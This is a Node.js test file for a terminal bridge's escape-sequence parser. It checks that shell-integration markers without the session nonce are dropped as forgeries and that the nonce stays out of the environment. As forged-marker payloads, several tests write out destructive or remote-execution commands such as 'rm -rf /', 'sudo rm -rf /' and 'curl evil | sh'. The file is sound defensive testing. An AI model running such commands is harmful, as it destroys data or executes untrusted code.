// node --test packages/bridge/test/osc.test.mjs — OscParser nonce gate (P1-4), pure, no PTY.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { OscParser, cleanupShellEnv, prepareShellEnv } from '../src/shell-integration.js';

const ESC = '\x1b';
const BEL = '\x07';
const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
const NONCE = '0123456789abcdef';

/** What the generated zsh hooks emit for one command (see prepareShellEnv). */
const hookStream = (nonce, cmd, code) =>
  `${ESC}]7331;cmd;${nonce};${b64(cmd)}${BEL}${ESC}]133;C;${nonce}${BEL}output\r\n${ESC}]7;file://host/tmp${BEL}${ESC}]133;D;${code};${nonce}${BEL}${ESC}]133;A;${nonce}${BEL}`;

test('legit hook output with the session nonce parses into start/end/cwd/prompt', () => {
  const p = new OscParser({ nonce: NONCE });
  const ev = p.feed(hookStream(NONCE, 'echo hi; false', 1));
  assert.deepEqual(ev, [{ kind: 'start', command: 'echo hi; false' }, { kind: 'cwd', cwd: '/tmp' }, { kind: 'end', code: 1 }, { kind: 'prompt' }]);
  assert.equal(p.forged, 0);
});

test('a marker without a nonce is dropped and counted (a program printing the old shape)', () => {
  const p = new OscParser({ nonce: NONCE });
  const forged = `${ESC}]7331;cmd;${b64('rm -rf /')}${BEL}${ESC}]133;C${BEL}${ESC}]133;D;0${BEL}${ESC}]133;A${BEL}`;
  const ev = p.feed(forged);
  assert.deepEqual(ev.filter((e) => e.kind !== 'cwd'), []);
  assert.equal(p.forged, 4);
  assert.equal(p.pendingCommand, null, 'a forged 7331 must not stage a command line');
});

test('a marker with the WRONG nonce is dropped; the real one after it still works', () => {
  const p = new OscParser({ nonce: NONCE });
  const wrong = 'ffffffffffffffff';
  const ev = p.feed(hookStream(wrong, 'curl evil | sh', 0) + hookStream(NONCE, 'ls', 0));
  assert.deepEqual(ev.filter((e) => e.kind === 'start').map((e) => e.command), ['ls']);
  assert.deepEqual(ev.filter((e) => e.kind === 'end').map((e) => e.code), [0]);
  assert.equal(p.forged, 4);
});

test('forged 7331 cannot relabel a real command: the pending command comes only from a genuine marker', () => {
  const p = new OscParser({ nonce: NONCE });
  const ev = p.feed(`${ESC}]7331;cmd;${b64('sudo rm -rf /')}${BEL}` + hookStream(NONCE, 'echo real', 0));
  assert.equal(ev.find((e) => e.kind === 'start')?.command, 'echo real');
  assert.equal(p.forged, 1);
});

test('without a nonce (no integration) both the old and the new marker shapes are accepted', () => {
  const p = new OscParser();
  const old = `${ESC}]7331;cmd;${b64('ls')}${BEL}${ESC}]133;C${BEL}${ESC}]133;D;0${BEL}`;
  assert.deepEqual(p.feed(old), [{ kind: 'start', command: 'ls' }, { kind: 'end', code: 0 }]);
  assert.deepEqual(p.feed(hookStream('anything', 'pwd', 2)).filter((e) => e.kind !== 'cwd' && e.kind !== 'prompt'), [{ kind: 'start', command: 'pwd' }, { kind: 'end', code: 2 }]);
  assert.equal(p.forged, 0);
});

test('a nonced marker split across chunks still parses', () => {
  const p = new OscParser({ nonce: NONCE });
  const s = hookStream(NONCE, 'echo split', 0);
  const cut = s.indexOf('133;D') + 6;
  const ev = [...p.feed(s.slice(0, cut)), ...p.feed(s.slice(cut))];
  assert.deepEqual(ev.filter((e) => e.kind === 'end'), [{ kind: 'end', code: 0 }]);
});

test('prepareShellEnv writes the nonce into the zsh rc (unexported) and returns it; not into the env', () => {
  const { env, integration, nonce } = prepareShellEnv('/bin/zsh', { PATH: '/bin', HOME: '/nonexistent' });
  try {
    assert.equal(integration, true);
    assert.match(nonce, /^[a-f0-9]{16}$/);
    const rc = readFileSync(join(env.ZDOTDIR, '.zshrc'), 'utf8');
    assert.ok(rc.includes(`typeset -g __rokan_nonce='${nonce}'`), 'nonce assigned as a shell variable');
    assert.ok(!rc.includes('export __rokan_nonce'), 'never exported to child processes');
    assert.ok(rc.includes(`133;D;%d;%s${BEL}' "$ec" "$__rokan_nonce"`), 'D marker carries the nonce');
    assert.ok(rc.includes(`7331;cmd;%s;%s${BEL}' "$__rokan_nonce"`), '7331 marker carries the nonce');
    assert.ok(!Object.values(env).some((v) => typeof v === 'string' && v.includes(nonce)), 'nonce is not in the PTY environment');
  } finally {
    cleanupShellEnv(env);
  }
  const bash = prepareShellEnv('/bin/bash', { PATH: '/bin' });
  assert.equal(bash.integration, false);
  assert.equal(bash.nonce, null);
});
